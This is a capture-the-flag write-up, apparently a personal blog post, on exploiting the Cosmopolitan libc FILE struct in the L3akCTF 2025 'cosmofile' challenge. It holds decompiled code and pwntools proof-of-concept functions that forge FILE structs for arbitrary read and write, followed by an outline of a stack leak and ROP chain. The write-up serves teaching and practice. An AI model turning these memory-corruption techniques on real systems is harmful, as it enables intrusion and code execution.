---
author: "nothoudaifa"
title: "writeup for pwn/cosmofile chall from l3akctf 2025"
date: "2025-07-14"
tags: 
- ctf 
- pwn
---

## TL;DR

this challenge is about exploiting https://github.com/jart/cosmopolitan FILE struct implementation.

## Initial Analysis

we are given `cosmofile` `Dockerfile` , using checksec on the binary we get:

```bash
[*] '/home/player/ctfs/l3ak/cosmofile/c/cosmofile'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

we can see that bsides NX, no security measure is enabled (which is good since we are exploiting it)

opening the binary in ida we get the following decompilation of the main function:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[4100]; // [rsp+0h] [rbp-1010h] BYREF
  int v5; // [rsp+1004h] [rbp-Ch]
  FILE *f; // [rsp+1008h] [rbp-8h]

  f = fopen("/tmp/cosmofile.txt", "rw+");
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  if ( f )
  {
    fwrite("Here is a secret of the universe:\n... huh?\n", 1uLL, 0x2BuLL, f);
    fwrite("It's not here...", 1uLL, 0x10uLL, f);
    fflush(f);
    rewind(f);
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          v5 = read_int();
          if ( v5 != (_DWORD)&unk_6E7472 )
            break;
          cosmo_puts("Whoa whoa whoa... you can't just hide the secret of the universe like that!");
          cosmo_puts("Just kidding, that's not really a secret...");
          read(0, f, 0x70uLL);
        }
        if ( v5 <= (int)&unk_6E7472 )
          break;
LABEL_12:
        cosmo_puts("Invalid choice. Please try again.");
      }
      if ( v5 != 1 )
      {
        if ( v5 == 2 )
        {
          cosmo_print("Exiting...\n");
          exit(0);
        }
        goto LABEL_12;
      }
      cosmo_print("Reading from cosmofile:\n");
      fread(buf, 1uLL, 0x1000uLL, f);
      cosmo_puts("Content of cosmofile:");
      write(1, buf, 0x1000uLL);
      cosmo_puts("\nNice, now you can see the universe in a different light!");
    }
  }
  perror("Failed to open file");
  return 1;
}
```

it starts by opening a file `/tmp/cosmofile.txt` and writing some data to it, then it gives us this menu:

```c
[[ cosmofile ]]
1. Read a secret of the universe
2. Exit
>
```

option 1 allows us to read from the file and write the output to stdout and option 2 let’s us exit, but actually there is one more secret option, `if ( v5 != (_DWORD)&unk_6E7472 )` if v5 is equal to 7238770 (0x6E7472 in decimal), we can write into the FILE struct.

## Exploring the FILE struct implementation:

this is a typical FILE struct exploitation ctf chall, where we can write into the FILE struct and we have to exploit it’s inner workings to get arbitrary execution (in this case), it’s just that this is not glibc.

looking into the FILE struct definition in ida we see this:

```c
00000000 struct FILE // sizeof=0x70
00000000 {                                       // XREF: .data:__stdin/r
00000000                                         // .data:__stdout/r
00000000     char bufmode;
00000001     char freethis;
00000002     char freebuf;
00000003     char forking;
00000004     int oflags;
00000008     int state;
0000000C     int fd;
00000010     int pid;
00000014     // padding byte
00000015     // padding byte
00000016     // padding byte
00000017     // padding byte
00000018     unsigned int size;
0000001C     unsigned int beg;
00000020     unsigned int end;
00000024     // padding byte
00000025     // padding byte
00000026     // padding byte
00000027     // padding byte
00000028     char *buf;
00000030     pthread_mutex_t lock;
00000058     Dll elem;                           // XREF: stdin_init:loc_4019BE/o
00000058                                         // stdout_init+6/o ...
00000068     char *getln;
00000070 };
```

since there is no function pointers in it we will have to get arb read/write and write into the stack.

opening the fread function, we see that it claims the lock then, calls `fread_unlocked` (which is where the logic of fread resides), it’s full decompilation is [here](/l3akctf2025-cosmofile/fread-decomp.c).

### Getting arb read:

we can see at first it does some checks for overflow / file is readable … etc , then it has this piece of code which can be used to getting arb read:

```c
v9 = count * (unsigned __int128)stride; // in our case v9 is (0x1000 * 1) = 0x1000
v13 = end - beg;
  if ( v13 >= (unsigned __int64)v9 )
  {
    nb = v9;
    memmove(buf, &f->buf[beg], v9);
    v32 = f->beg + nb;
    f->beg = v32;
    if ( v32 == f->end )
      *(_QWORD *)&f->beg = 0LL;
    return count;
  }
```

it checks if end - beg , which is the amount of data available in f->buf is bigger than how much fread wants, and if it is it just memmove’s the data from the f→buf to the user provided buffer (which will be written to stdout after fread finishes) then it returns, since we can control f→buf, we can get arb read using this.

here is a simple pwntools poc for getting arb read, our payload sets buf to the addr we want to read from and makes sure that end - beg is bigger than 0x1000, note that the payload is just the default values of the FILE struct with `beg`, `end`, `size` and `addr` replaced in, since they are the only values we want to change.

```python
def arb_read(addr):
    sz = 0x1000
    beg = 0x0
    end = 0x1000
    payload = p64(0x0000024200010100)+p64(0x0000000300000000)+p64(0x0000000000000000)\
    +p32(sz)+p32(beg)+p32(end)+p32(0x0)+p64(addr)+p64(0x0)+p64(0x2)+p64(0x0)*3\
    +p64(0x000000000042f338)+ p64(0x000000000042f3d8)+p64(0x0000000000000000)

    write_to_FILE(payload)
    return call_fread() 
```

### Getting arb write:

the only way we can get arb write is if fread writes into the FILE struct buf, and that only happens in this part of the function:

```c

  v9 = count * (unsigned __int128)stride;
  v11 = v9;
  if ( end != beg )
  {
    na = v11;
    buf = memmove(buf, &f->buf[beg], v13);
    fd = f->fd;
    v11 = na;
  }
  iov[0].iov_base = (char *)buf + v13;
  v15 = v11 - v13;
  iov[0].iov_len = v11 - v13;
  if ( f->bufmode == 2 || (size = f->size, v11 >= size) )
  {
    size = 0LL;
    v17 = 0LL;
  }
  else
  {
    v17 = f->buf;
    if ( (unsigned int)size > 0xC )
      size = (unsigned int)(size - 12);
  }
  iov[1].iov_base = v17;
  iov[1].iov_len = size;
  v18 = 2;
  v19 = iov;
  while ( 2 )
  {
    v35 = v15;
    v36 = v18;
    n = (size_t)v19;
    v20 = readv(fd, v19, v18);
```

we reach this part of the fread functions when f→buf does not have enough data to fulfill the the request of fread, so reads what’s left in f→buf and calls readv to read more data from the file into the user buffer, and in the way it also read’s in f->buf `f->size-0xc` bytes, we can use this in addition to changing the f->fd to 0 (stdin), so we can get arb write from stdin, here is a simple pwntools poc that shows how it’s done:

```python
def get_write(addr, data):
    sz = 0x1001 // size needs to be strictly bigger than what the user wants
    beg = 0x0
    end = 0x0
    payload = p64(0x0000024200010100)+p64(0x0000000000000000)+p64(0x0000000000000000)\
    +p32(sz)+p32(beg)+p32(end)+p32(0x0)+p64(addr)+p64(0x0)+p64(0x2)+p64(0x0)*3\
    +p64(0x000000000042f338)+ p64(0x000000000042f3d8)+p64(0x0000000000000000)

    write_to_FILE(payload)

    p.sendlineafter(b'>', b'1') // call fread
    // after this it will read from stdin
    pay = b'a'*(0x1000) // send 0x1000 bytes for the user buffer
    pay += data  // the rest will be read into f->buf
    pay = pay + b'c'*(0x1000+4085-len(pay)) // readv will continue reading until it gets all the bytes it requests, so we add this dummy data
    p.send(pay)  
```

## Exploitation:

now that we have both arb_read and arb_write, we can just get a stack addr from the binary memory and write into the return address of fread (because we can’t write into the ret of main, since it exits).

we can get a stack leak by reading the value at `&__argv` and then subtract the offset for the return address of fread, after that we just write our rop chain, apparently there are no binaries inside the jail of the docker container, so we have to read the flag.txt directly using the rop chain.

the final exploit is [here](/l3akctf2025-cosmofile/exploit.py).

running it gives us the flag : `L3AK{JU57_b3c4u43_7H3R3_15_N0_vft4bl3_D035N7_m34n_Y0U_5h0uld_61V3_up}`
